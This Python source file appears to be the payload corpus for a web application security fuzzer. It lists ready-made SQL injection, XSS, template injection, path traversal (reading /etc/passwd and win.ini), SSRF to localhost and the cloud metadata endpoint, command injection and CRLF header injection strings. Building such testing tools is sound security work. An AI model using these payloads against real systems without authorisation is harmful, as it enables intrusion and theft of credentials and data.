"""Web App Fuzzer - payload corpora per module.

Payload templates may contain the ``{marker}`` placeholder, which the engine
replaces with a random per-case token for reflection / execution detection.
"""
from __future__ import annotations

import random
import string
from typing import Dict, List, Tuple

Payload = Tuple[str, str]

_MARKER_CHARS = string.ascii_uppercase + string.digits
_MARKER_LEN = 8


def new_marker() -> str:
    return "FUZ" + "".join(random.choice(_MARKER_CHARS) for _ in range(_MARKER_LEN))


_TRAILS = [
    ("win.ini", "[fonts]"),
    ("etc/passwd", "root:"),
    ("etc/hosts", "localhost"),
]

_SQL_ERROR_RE = (
    r"(?i)(sqlstate|sql syntax|syntax error|unclosed quotation|query failed|"
    r"odbc driver|mysql_fetch|ora-\d{5}|microsoft oledb|you have an error in your sql|"
    r"pg_exec|invalid query|error.*sql|sqlite)"
)

_STACK_RE = (
    r"(?i)(traceback|stack trace|exception|at\s+[\w.$]+\("
    r"|system\.[\w.]+|java\.\w+\.)|pl/pgsql|debug_backtrace|throw new"
)


def load_payloads(module: str) -> List[Payload]:
    return _REGISTRY.get(module, [])


_REGISTRY: Dict[str, List[Payload]] = {
    "sqli": [
        ("sqli-boolean-1", "' OR '1'='1"),
        ("sqli-boolean-2", "\" OR \"1\"=\"1"),
        ("sqli-boolean-3", "' OR 1=1--"),
        ("sqli-boolean-4", "1 OR 1=1"),
        ("sqli-error-1", "'"),
        ("sqli-error-2", "\""),
        ("sqli-error-3", "' AND 1=CONVERT(int,@@version)--"),
        ("sqli-error-4", "1 AND 1=1"),
        ("sqli-union-1", "' UNION SELECT NULL--"),
        ("sqli-time-mysql", "' AND SLEEP(2)--"),
        ("sqli-time-mssql", "; WAITFOR DELAY '0:0:2'--"),
        ("sqli-time-pg", "' || pg_sleep(2)--"),
    ],
    "xss": [
        ("xss-script", "<script>{marker}</script>"),
        ("xss-attr", "\" onmouseover={marker}"),
        ("xss-img", "<img src=x onerror={marker}>"),
        ("xss-svg", "<svg/onload={marker}>"),
        ("xss-js", "');alert(1);//"),
        ("xss-html", "<b>{marker}</b>"),
    ],
    "ssti": [
        ("ssti-1", "{{7*7}}"),
        ("ssti-2", "${{7*7}}"),
        ("ssti-3", "${7*7}"),
        ("ssti-4", "#{7*7}"),
        ("ssti-5", "<%= 7*7 %>"),
    ],
    "traversal": [
        ("trav-1", "../../../../../../etc/passwd"),
        ("trav-2", "....//....//....//....//etc/passwd"),
        ("trav-3", "../../../../../../windows/win.ini"),
        ("trav-4", "..\\..\\..\\..\\..\\windows\\win.ini"),
        ("trav-5", "%2e%2e%2f%2e%2e%2fetc%2fpasswd"),
        ("trav-6", "..%2f..%2f..%2fetc%2fpasswd"),
    ],
    "ssrf": [
        ("ssrf-local", "http://127.0.0.1/"),
        ("ssrf-metadata", "http://169.254.169.254/latest/meta-data/"),
        ("ssrf-hex", "http://0x7f000001/"),
        ("ssrf-ipv6", "http://[::1]/"),
        ("ssrf-file", "file:///etc/passwd"),
        ("ssrf-gopher", "gopher://127.0.0.1:80/_hi"),
    ],
    "cmdi": [
        ("cmdi-backtick", "`{marker}`"),
        ("cmdi-dollar", "$({marker})"),
        ("cmdi-pipe", "| {marker}"),
        ("cmdi-semi", "; {marker}"),
        ("cmdi-and", "&& {marker}"),
        ("cmdi-nl", "%0a{marker}"),
        ("cmdi-platform", "& echo {marker}"),
    ],
    "header": [
        ("crlf-hdr", "{marker}%0d%0aX-Injected-Hdr:{marker}"),
        ("crlf-body", "{marker}%0d%0a%0d%0a<html>{marker}</html>"),
    ],
    "errors": [
        ("err-num", "notanumber"),
        ("err-quote", "'"),
        ("err-percent", "%%"),
        ("err-brace", "{}"),
        ("err-null", "%00"),
        ("err-neg", "-"),
        ("err-float", "0.0.0"),
    ],
    "boundary": [
        ("bnd-empty", ""),
        ("bnd-long", "A" * 5000),
        ("bnd-unicode", "r\u00e9sum\u00e9"),
        ("bnd-minus", "-1"),
        ("bnd-maxint", "99999999999999999999"),
    ],
    "auth": [
        ("auth-admin", "admin"),
        ("auth-empty-token", ""),
        ("auth-junk-token", "0"),
        ("auth-long-token", "A" * 1024),
        ("auth-or-1", "' OR '1'='1"),
    ],
}